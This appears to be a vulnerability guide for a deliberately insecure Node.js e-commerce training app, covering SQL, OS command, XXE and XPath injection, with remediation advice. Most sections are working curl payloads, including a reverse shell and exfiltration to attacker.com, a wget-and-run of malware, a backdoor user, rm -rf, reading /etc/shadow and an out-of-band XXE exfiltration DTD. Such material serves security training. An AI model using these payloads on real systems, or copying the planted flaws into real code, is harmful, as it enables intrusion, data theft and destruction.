# Complete Vulnerability Documentation

This document details all 7 intentional vulnerabilities in the e-commerce application.

## Summary

1. **SQL Injection** - Product search endpoint
2. **OS Command Injection #1** - System info endpoint
3. **OS Command Injection #2** - Log export endpoint
4. **OS Command Injection #3** - Database backup endpoint
5. **XXE Injection #1** - Sales report upload
6. **XXE Injection #2** - Product import
7. **XPath Injection** - User search endpoint

---

## 1. SQL Injection

### Location
- **File**: `routes/products.js`
- **Endpoint**: `GET /api/products/search`
- **Severity**: CRITICAL (CVSS 9.8)

### Vulnerable Code
```javascript
router.get('/search', async (req, res) => {
  const { query, category, minPrice, maxPrice } = req.query;
  let sql = 'SELECT * FROM products WHERE 1=1';
  
  if (query) {
    sql += ` AND (name LIKE '%${query}%' OR description LIKE '%${query}%')`;
  }
  
  const [products] = await db.query(sql);
  res.json(products);
});
```

### Exploitation Examples
```bash
# Extract all products
curl "http://localhost:3000/api/products/search?query=test' OR '1'='1"

# Extract user credentials
curl "http://localhost:3000/api/products/search?query=test' UNION SELECT id,email,password,first_name,last_name,phone,role,created_at FROM users -- "

# Extract database tables
curl "http://localhost:3000/api/products/search?query=test' UNION SELECT table_name,2,3,4,5,6,7,8 FROM information_schema.tables WHERE table_schema='ecommerce_db' -- "
```

---

## 2. OS Command Injection #1 - System Info

### Location
- **File**: `routes/admin.js`
- **Endpoint**: `GET /api/admin/system-info`
- **Severity**: CRITICAL (CVSS 10.0)

### Vulnerable Code
```javascript
router.get('/system-info', authenticateToken, isAdmin, async (req, res) => {
  const { command } = req.query;
  const fullCommand = `${command}`;
  
  exec(fullCommand, (error, stdout, stderr) => {
    res.json({ output: stdout });
  });
});
```

### Exploitation Examples
```bash
# Get JWT token first (admin account needed)
TOKEN="your_admin_jwt_token"

# Execute single command
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:3000/api/admin/system-info?command=whoami"

# Command chaining - read /etc/passwd
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:3000/api/admin/system-info?command=ls;cat%20/etc/passwd"

# Command substitution
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:3000/api/admin/system-info?command=echo%20\$(whoami)"

# Reverse shell (Linux)
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:3000/api/admin/system-info?command=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/attacker.com/4444%200>%261'"
```

### Impact
- Complete system compromise
- Remote code execution
- Data exfiltration
- Lateral movement in network

---

## 3. OS Command Injection #2 - Log Export

### Location
- **File**: `routes/admin.js`
- **Endpoint**: `POST /api/admin/export-logs`
- **Severity**: CRITICAL (CVSS 10.0)

### Vulnerable Code
```javascript
router.post('/export-logs', authenticateToken, isAdmin, async (req, res) => {
  const { filename, format } = req.body;
  const outputPath = `/tmp/${filename}`;
  const command = `cp /var/log/app.log ${outputPath}`;
  
  exec(command, (error, stdout, stderr) => {
    res.json({ path: outputPath });
  });
});
```

### Exploitation Examples
```bash
TOKEN="your_admin_jwt_token"

# Command injection via filename
curl -X POST http://localhost:3000/api/admin/export-logs \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"filename": "log.txt; cat /etc/shadow > /tmp/stolen.txt"}'

# Download sensitive files
curl -X POST http://localhost:3000/api/admin/export-logs \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"filename": "log.txt; curl http://attacker.com/exfil?data=$(base64 /etc/passwd)"}'

# Create backdoor user
curl -X POST http://localhost:3000/api/admin/export-logs \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"filename": "log.txt; useradd -m -p password backdoor"}'
```

---

## 4. OS Command Injection #3 - Database Backup

### Location
- **File**: `routes/admin.js`
- **Endpoint**: `POST /api/admin/backup`
- **Severity**: CRITICAL (CVSS 10.0)

### Vulnerable Code
```javascript
router.post('/backup', authenticateToken, isAdmin, async (req, res) => {
  const { backupName, email } = req.body;
  let command = `mysqldump ... > /tmp/${backupName}.sql`;
  
  if (email) {
    command += ` && echo "Backup completed" | mail -s "Backup" ${email}`;
  }
  
  exec(command, (error, stdout, stderr) => {
    res.json({ message: 'Backup completed' });
  });
});
```

### Exploitation Examples
```bash
TOKEN="your_admin_jwt_token"

# Command injection via backupName
curl -X POST http://localhost:3000/api/admin/backup \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"backupName": "db; rm -rf /var/www/html"}'

# Command injection via email
curl -X POST http://localhost:3000/api/admin/backup \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "backupName": "database_backup",
    "email": "user@example.com; wget http://attacker.com/malware.sh -O /tmp/m.sh && bash /tmp/m.sh"
  }'

# Exfiltrate database to external server
curl -X POST http://localhost:3000/api/admin/backup \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "backupName": "backup",
    "email": "user@example.com; curl -F file=@/tmp/backup.sql http://attacker.com/upload"
  }'
```

---

## 5. XXE Injection #1 - Sales Report Upload

### Location
- **File**: `routes/reports.js`
- **Endpoint**: `POST /api/reports/upload-sales`
- **Severity**: HIGH (CVSS 8.6)

### Vulnerable Code
```javascript
router.post('/upload-sales', authenticateToken, isAdmin, async (req, res) => {
  const { xmlData } = req.body;
  
  const parserOptions = {
    noent: true,    // Enable entity expansion
    dtdload: true,  // Load external DTD
    dtdvalid: true  // Validate against DTD
  };
  
  const xmlDoc = libxmljs.parseXml(xmlData, parserOptions);
  // Process XML...
});
```

### Exploitation Examples

#### Read Local Files
```bash
TOKEN="your_admin_jwt_token"

# Read /etc/passwd
curl -X POST http://localhost:3000/api/reports/upload-sales \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "xmlData": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><salesReport><reportName>&xxe;</reportName><period>Q1</period><totalSales>1000</totalSales></salesReport>"
  }'
```


#### Read Application Files
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///app/.env">
]>
<salesReport>
  <reportName>&xxe;</reportName>
  <period>Q1 2024</period>
  <totalSales>50000</totalSales>
</salesReport>
```

#### SSRF Attack
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server.local/admin">
]>
<salesReport>
  <reportName>&xxe;</reportName>
  <period>Q1</period>
  <totalSales>1000</totalSales>
</salesReport>
```

#### Billion Laughs Attack (DoS)
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<salesReport>
  <reportName>&lol4;</reportName>
  <period>Q1</period>
  <totalSales>1000</totalSales>
</salesReport>
```

---

## 6. XXE Injection #2 - Product Import

### Location
- **File**: `routes/reports.js`
- **Endpoint**: `POST /api/reports/import-products`
- **Severity**: HIGH (CVSS 8.6)

### Vulnerable Code
```javascript
router.post('/import-products', authenticateToken, isAdmin, async (req, res) => {
  const { xmlContent } = req.body;
  
  const parser = new xml2js.Parser({
    explicitChildren: true,
    preserveChildrenOrder: true
    // External entities NOT disabled (vulnerable)
  });
  
  parser.parseString(xmlContent, async (err, result) => {
    // Process products...
  });
});
```

### Exploitation Examples

#### Read Database Configuration
```bash
TOKEN="your_admin_jwt_token"

curl -X POST http://localhost:3000/api/reports/import-products \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "xmlContent": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///app/.env\">]><products><product><name>&xxe;</name><price>100</price><stock>10</stock></product></products>"
  }'
```

#### Read Source Code
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY code SYSTEM "file:///app/routes/auth.js">
]>
<products>
  <product>
    <name>Test Product</name>
    <description>&code;</description>
    <price>99.99</price>
    <stock>100</stock>
  </product>
</products>
```

#### Out-of-Band Data Exfiltration
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %send;
]>
<products>
  <product>
    <name>Product</name>
  </product>
</products>
```

Where `evil.dtd` contains:
```xml
<!ENTITY % payload "<!ENTITY send SYSTEM 'http://attacker.com/exfil?data=%file;'>">
%payload;
```

---

## 7. XPath Injection

### Location
- **File**: `routes/search.js`
- **Endpoint**: `GET /api/search/users`
- **Severity**: HIGH (CVSS 8.1)

### Vulnerable Code
```javascript
router.get('/users', authenticateToken, async (req, res) => {
  const { username, role } = req.query;
  
  let xpathQuery;
  if (username) {
    xpathQuery = `//user[username='${username}']`;
  } else if (role) {
    xpathQuery = `//user[role='${role}']`;
  }
  
  const nodes = xpath.select(xpathQuery, doc);
  // Return user data including sensitive fields like apiKey
});
```

### XML Data Structure
```xml
<users>
  <user id="1">
    <username>admin</username>
    <email>admin@example.com</email>
    <role>administrator</role>
    <apiKey>sk_live_admin_key_12345</apiKey>
  </user>
  <!-- More users... -->
</users>
```

### Exploitation Examples

#### Authentication Bypass
```bash
TOKEN="your_jwt_token"

# Get all users regardless of username
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:3000/api/search/users?username=admin'%20or%20'1'='1"

# Boolean-based injection
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:3000/api/search/users?role=customer'%20or%20'1'='1"
```

#### Extract All Users and API Keys
```bash
# Using XPath functions to extract all data
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:3000/api/search/users?username=notexist']%20|%20//user%20|%20//user[username='"

# Simplified version
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:3000/api/search/users?username=']%20|%20//*%20|%20//user['"
```

#### Count Users
```bash
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:3000/api/search/users?username=admin'%20and%20count(//user)>0%20and%20'1'='1"
```

#### Blind XPath Injection - Extract Data Character by Character
```bash
# Check if first character of admin's API key is 's'
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:3000/api/search/users?username=admin'%20and%20substring(//user[username='admin']/apiKey,1,1)='s'%20and%20'1'='1"

# Check if second character is 'k'
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:3000/api/search/users?username=admin'%20and%20substring(//user[username='admin']/apiKey,2,1)='k'%20and%20'1'='1"
```

#### Extract Specific User Information
```bash
# Get admin's email
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:3000/api/search/users?username=']%20|%20//user[username='admin']/*%20|%20//user[username='"

# Get all administrator roles
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:3000/api/search/users?role=']%20|%20//user[role='administrator']%20|%20//user[role='"
```

### Impact
- Bypass authentication logic
- Extract sensitive data (API keys, emails, phone numbers)
- Enumerate all users in the system
- Access to administrative accounts
- Privilege escalation

---

## Summary of Vulnerabilities by Severity

### CRITICAL (4 vulnerabilities)
1. SQL Injection - CVSS 9.8
2. OS Command Injection #1 - CVSS 10.0
3. OS Command Injection #2 - CVSS 10.0
4. OS Command Injection #3 - CVSS 10.0

### HIGH (3 vulnerabilities)
5. XXE Injection #1 - CVSS 8.6
6. XXE Injection #2 - CVSS 8.6
7. XPath Injection - CVSS 8.1

## Remediation Summary

### SQL Injection
✅ Use parameterized queries / prepared statements
✅ Input validation and sanitization
✅ Principle of least privilege for database user

### OS Command Injection
✅ Avoid shell command execution with user input
✅ Use language-specific APIs instead of shell commands
✅ Input validation with strict whitelist
✅ Escape shell metacharacters if shell execution is necessary

### XXE Injection
✅ Disable external entity processing in XML parsers
✅ Use less complex data formats like JSON
✅ Keep XML processors updated
✅ Implement proper input validation

### XPath Injection
✅ Use parameterized XPath queries
✅ Input validation and sanitization
✅ Whitelist allowed characters
✅ Consider using JSON instead of XML

## Testing Tools

### Automated Scanners
- OWASP ZAP
- Burp Suite Pro
- Nikto
- SQLMap (for SQL injection)

### Manual Testing
- cURL (command line)
- Postman
- Burp Suite Community
- Browser Developer Tools

---

**WARNING**: These vulnerabilities are intentionally included for security testing and educational purposes. Never deploy this application in a production environment or expose it to the internet.
